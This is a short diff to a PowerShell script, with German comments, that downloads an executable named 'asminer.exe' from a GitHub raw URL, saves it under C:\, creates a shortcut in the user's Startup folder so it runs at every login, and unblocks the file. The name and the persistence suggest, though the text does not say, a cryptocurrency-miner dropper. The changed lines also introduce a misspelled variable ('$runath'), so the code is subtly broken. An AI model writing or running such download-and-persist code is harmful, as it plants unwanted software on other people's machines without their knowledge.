@@ -1,7 +1,7 @@
 $startupPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup\asminer.lnk")
 #$Path = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows")
 $Path = "C:\"
-$runpath = [System.IO.Path]::Combine($Path, "Microsoft\Windows\asminer.exe")
+$runpath = [System.IO.Path]::Combine($Path, "\asminer.exe")
 # URL der Datei, die heruntergeladen werden soll
 $url = "https://github.com/Lorcan84/test/raw/main/asminer.exe"
 
@@ -19,7 +19,7 @@ $shortcut = $shell.CreateShortcut($startupPath)
 
 # Pfad und Argumente für die Verknüpfung setzen
 $shortcut.TargetPath = $runpath
-$shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($Path)
+$shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($runath)
 $shortcut.Save()
 
 Unblock-File -Path $Path
